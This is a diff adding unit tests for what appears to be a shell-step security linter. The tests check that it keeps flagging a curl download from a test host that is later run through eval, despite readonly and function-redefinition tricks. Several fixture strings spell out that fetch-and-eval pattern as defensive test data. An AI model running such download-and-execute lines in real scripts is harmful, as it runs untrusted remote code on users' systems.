@@ -2100,6 +2100,93 @@ class TestADownloadCarriedInAVariable(unittest.TestCase):
                     reason.startswith("runs `eval` on `$X`") for reason in why
                 ), why)
 
+    def test_2437_unproved_function_paths_keep_readonly_fail_closed(self):
+        # Review round five: a skipped call is safe only when its status is a proof, and a dynamic
+        # command word may itself be readonly or call any body. Each row can make X readonly in
+        # the step's shell, so the later assignment cannot prove that the download was retired.
+        rows = (
+            ("readonly in a nested definition",
+             "f() { g() { readonly X; }; g; }\nf\n"),
+            ("readonly array in a nested definition",
+             "f() { g() { readonly -a X; }; g; }\nf\n"),
+            ("global readonly declaration in a nested definition",
+             "f() { g() { declare -gr X; }; g; }\nf\n"),
+            ("global readonly typeset in a nested definition",
+             "f() { g() { typeset -gr X; }; g; }\nf\n"),
+            ("dynamic function call",
+             "f() { readonly X; }\nF=f\n$F\n"),
+            ("negated false in if",
+             "f() { readonly X; }\nif ! false; then f; fi\n"),
+            ("negated false before and",
+             "f() { readonly X; }\n! false && f\n"),
+            ("negated true before or",
+             "f() { readonly X; }\n! true || f\n"),
+            ("redefined false in if",
+             "f() { readonly X; }\nfalse() { :; }\nif false; then f; fi\n"),
+            ("redefined false before and",
+             "f() { readonly X; }\nfalse() { :; }\nfalse && f\n"),
+            ("negated false in elif",
+             'f() { readonly X; }\nif [ -n "$A" ]; then :; '
+             "elif ! false; then f; fi\n"),
+            ("dynamic readonly command", "R=readonly\n$R X\n"),
+            ("conditional dynamic function call",
+             'f() { readonly X; }\nF=f\nif [ -n "$A" ]; then $F; fi\n'),
+            ("nested definition call",
+             "f() { g() { readonly X; }; g; }\nf\n"),
+            ("redefined true before or",
+             "f() { readonly X; }\ntrue() { false; }\ntrue || f\n"),
+        )
+        get = "X=$(curl -fsSL https://e.test/x)\n"
+        for name, middle in rows:
+            script = get + middle + 'X=safe\neval "$X"\n'
+            for shell in self.SHELLS:
+                with self.subTest(row=name, shell=shell):
+                    why = [str(reason) for _step, reason in wg.job_defects([
+                        wg.Step("run", script, shell)
+                    ])]
+                    self.assertEqual(1, sum(
+                        reason.startswith("runs `eval` on `$X`") for reason in why
+                    ), why)
+
+    def test_2437_round_five_keeps_proved_dead_and_child_controls_clean(self):
+        get = "X=$(curl -fsSL https://e.test/x)\n"
+        middles = (
+            "f() { readonly X; }\nif false; then f; fi\nX=safe\n",
+            "f() { readonly X; }\nif false\nthen\n  f\nfi\nX=safe\n",
+            "f() { readonly X; }\nfalse && f\nX=safe\n",
+            ('f() { readonly X; }\nif [ -n "$A" ]; then :; '
+             "elif false; then f; fi\nX=safe\n"),
+            "f() { local X; readonly X; }\nf\nX=safe\n",
+            "f() { local -r X; declare -g X; }\nf\nX=safe\n",
+            "f() { ( readonly X ); }\nf\nX=safe\n",
+            "f() { readonly X; }\nf | cat\nX=safe\n",
+            "f() { readonly X; }\nf & wait\nX=safe\n",
+            "f() { readonly X; }\n( f )\nX=safe\n",
+            "f || true\nf() { readonly X; }\nX=safe\n",
+            "f() { readonly Y; }\nf\nX=safe\n",
+            "f() { readonly X; }\ntime false && f\nX=safe\n",
+            "f() { g() { echo readonly X; }; g; }\nf\nX=safe\n",
+        )
+        for middle in middles:
+            for shell in self.SHELLS:
+                with self.subTest(middle=middle, shell=shell):
+                    self.assertEqual([], wg.job_defects([
+                        wg.Step("run", get + middle + 'eval "$X"\n', shell)
+                    ]))
+
+        # The reader does not prove a loop dead from its condition, an accepted safe-direction
+        # price: preserving this report keeps the skip exception narrower than shell execution.
+        script = (get + "f() { readonly X; }\nwhile false; do f; done\n"
+                  'X=safe\neval "$X"\n')
+        for shell in self.SHELLS:
+            with self.subTest(middle="while false price", shell=shell):
+                why = [str(reason) for _step, reason in wg.job_defects([
+                    wg.Step("run", script, shell)
+                ])]
+                self.assertEqual(1, sum(
+                    reason.startswith("runs `eval` on `$X`") for reason in why
+                ), why)
+
     def test_2437_a_skipped_or_child_reassignment_keeps_the_download(self):
         controls = ("{ x=1; } | cat\n", "{ x=1; } &\nwait\n",
                     ("{\n  x=1\n} 2>/dev/null < "
